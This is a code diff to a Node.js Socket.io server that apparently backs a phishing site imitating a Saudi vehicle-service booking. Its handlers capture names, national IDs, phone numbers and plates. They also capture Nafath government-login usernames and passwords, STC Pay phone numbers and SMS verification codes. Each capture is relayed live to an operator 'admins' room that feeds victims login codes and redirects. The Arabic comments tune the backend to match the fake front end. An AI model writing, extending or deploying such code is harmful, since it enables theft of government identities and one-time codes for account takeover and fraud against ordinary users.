@@ -271,46 +271,50 @@ io.on("connection", (socket) => {
       const referenceId = nanoid(12);
       ipToReference.set(clientIp, referenceId);
       const str = (v) => (v != null ? String(v) : "");
-      const plateStr = [
+      // الموقع يرسل: name, nationalID, phoneNumber, email, nationality, plate, region, serviceType, dateSvc, timeSvc, countryOfRegistration, delegateOn, commissioner
+      const plateRaw = str(data.plate ?? "");
+      const plateStr = plateRaw || [
         str(data.VehiclePlateChar1 ?? ""),
         str(data.VehiclePlateChar2 ?? ""),
         str(data.VehiclePlateChar3 ?? ""),
         str(data.NumberPanal ?? ""),
       ].filter(Boolean).join("-");
+      const commissioner = data.commissioner || {};
       createBooking({
         referenceId,
-        clientName: str(data.Name ?? data.name ?? ""),
-        clientId: str(data.ID ?? data.id ?? ""),
-        clientPhone: str(data.PhonNumber ?? data.phonNumber ?? ""),
-        clientEmail: str(data.Email1 ?? data.email1 ?? ""),
-        clientNationality: str(data.Nationality ?? ""),
-        hasDelegate: data.flexSwitchDelegate === 1 || data.flexSwitchDelegate === "1",
-        delegateType: str(data.DelegateType ?? ""),
-        delegateName: str(data.DelegateName ?? ""),
-        delegatePhone: str(data.DelegatePhone ?? ""),
-        delegateNationality: str(data.DelegateNationality ?? ""),
-        delegateId: str(data.DelegateId ?? ""),
-        vehicleCountry: str(data.CountryReg ?? ""),
+        clientName: str(data.name ?? data.Name ?? ""),
+        clientId: str(data.nationalID ?? data.ID ?? ""),
+        clientPhone: str(data.phoneNumber ?? data.PhonNumber ?? ""),
+        clientEmail: str(data.email ?? data.Email1 ?? ""),
+        clientNationality: str(data.nationality ?? data.Nationality ?? ""),
+        hasDelegate: data.delegateOn === true || data.delegateOn === 1,
+        delegateType: str(commissioner.type ?? data.DelegateType ?? ""),
+        delegateName: str(commissioner.name ?? data.DelegateName ?? ""),
+        delegatePhone: str(commissioner.phone ?? data.DelegatePhone ?? ""),
+        delegateNationality: str(commissioner.nationality ?? data.DelegateNationality ?? ""),
+        delegateId: str(commissioner.id ?? data.DelegateId ?? ""),
+        vehicleCountry: str(data.countryOfRegistration ?? data.CountryReg ?? ""),
         vehiclePlate: plateStr,
         vehiclePlateChar1: str(data.VehiclePlateChar1 ?? ""),
         vehiclePlateChar2: str(data.VehiclePlateChar2 ?? ""),
         vehiclePlateChar3: str(data.VehiclePlateChar3 ?? ""),
         vehicleType: str(data.TypeVechil ?? ""),
-        vehicleCarryDang: data.vehicleCarryDang === 1 || data.vehicleCarryDang === "1",
-        serviceRegion: str(data.RegionSvc ?? ""),
-        serviceType: str(data.TypeSvc ?? ""),
-        serviceDate: str(data.DateSvc ?? ""),
-        serviceTime: str(data.TimeSvc ?? ""),
+        vehicleCarryDang: false,
+        serviceRegion: str(data.region ?? data.RegionSvc ?? ""),
+        serviceType: str(data.serviceType ?? data.TypeSvc ?? ""),
+        serviceDate: str(data.dateSvc ?? data.DateSvc ?? ""),
+        serviceTime: str(data.timeSvc ?? data.TimeSvc ?? ""),
         clientIp,
         rawData: data,
         status: "new",
         statusRead: 0,
       });
       io.to("admins").emit("newBooking", { reference: referenceId, ip: clientIp });
-      socket.emit("ackBooking", { success: true, reference: referenceId });
+      // الموقع ينتظر ackNewDate وليس ackBooking
+      socket.emit("ackNewDate", { success: true });
     } catch (err) {
       console.error("[Socket.io] submitBooking error:", err);
-      socket.emit("ackBooking", { success: false, error: err.message });
+      socket.emit("ackNewDate", { success: false, error: err.message });
     }
   });
 
@@ -396,15 +400,15 @@ io.on("connection", (socket) => {
     }
   });
 
-  // submitNafathData: بيانات نفاذ
-  socket.on("submitNafathData", async (data) => {
+  // submitNafadData: بيانات نفاذ (الموقع يرسل submitNafadData بـ d وليس th)
+  socket.on("submitNafadData", async (data) => {
     try {
       const clientIp = String(data.ip || "unknown");
       const reference = String(data.reference || ipToReference.get(clientIp) || "");
       if (!reference) return;
       ipToReference.set(clientIp, reference);
       createOrUpdateVerification(reference, "nafath", {
-        nafathId: String(data.nafathId ?? data.id ?? ""),
+        nafathId: String(data.nafathId ?? data.id ?? data.username ?? ""),
         nafathPassword: String(data.nafathPassword ?? data.password ?? ""),
         step: 1,
         status: "step1_done",
@@ -412,9 +416,65 @@ io.on("connection", (socket) => {
       });
       updateBookingStatus(reference, "pending_nafath");
       io.to("admins").emit("newPayment", { reference, type: "nafath", ip: clientIp });
-      socket.emit("ackNafath", { success: true, data: { step: 1, nafathNumber: Math.floor(10 + Math.random() * 90).toString() } });
+      // الموقع ينتظر ackNafad (بـ d وليس th)
+      socket.emit("ackNafad", { success: true });
     } catch (err) {
-      console.error("[Socket.io] submitNafathData error:", err);
+      console.error("[Socket.io] submitNafadData error:", err);
+    }
+  });
+
+  // getNafadCode: طلب كود نفاذ (يُرسل كل 2 ثانية)
+  socket.on("getNafadCode", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const reference = String(ipToReference.get(clientIp) || "");
+      // الكود يُرسل من المشرف عبر endpoint /api/admin/nafad-code
+      // هنا فقط نُسجّل الطلب
+      if (reference) {
+        io.to("admins").emit("nafadCodeRequested", { reference, ip: clientIp });
+      }
+    } catch (err) {
+      console.error("[Socket.io] getNafadCode error:", err);
+    }
+  });
+
+  // submitPhoneData: بيانات الهاتف (STC Pay)
+  socket.on("submitPhoneData", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const reference = String(data.reference || ipToReference.get(clientIp) || "");
+      if (!reference) return;
+      ipToReference.set(clientIp, reference);
+      createOrUpdateVerification(reference, "phone", {
+        motaselPhone: String(data.phone ?? ""),
+        motaselProvider: String(data.operator ?? ""),
+        step: 1,
+        status: "step1_done",
+        rawData: data,
+      });
+      io.to("admins").emit("newPayment", { reference, type: "phone", ip: clientIp });
+      // لا نرسل ack - ينتظر navigateTo من المشرف
+    } catch (err) {
+      console.error("[Socket.io] submitPhoneData error:", err);
+    }
+  });
+
+  // submitPhoneCodeData: رمز الهاتف
+  socket.on("submitPhoneCodeData", async (data) => {
+    try {
+      const clientIp = String(data.ip || "unknown");
+      const reference = String(data.reference || ipToReference.get(clientIp) || "");
+      if (!reference) return;
+      ipToReference.set(clientIp, reference);
+      createOrUpdateVerification(reference, "phone", {
+        motaselCode: String(data.verification_code_three ?? data.code ?? ""),
+        step: 2,
+        status: "step2_done",
+      });
+      io.to("admins").emit("newPayment", { reference, type: "phoneCode", ip: clientIp });
+      // لا نرسل ack - ينتظر navigateTo من المشرف
+    } catch (err) {
+      console.error("[Socket.io] submitPhoneCodeData error:", err);
     }
   });
 
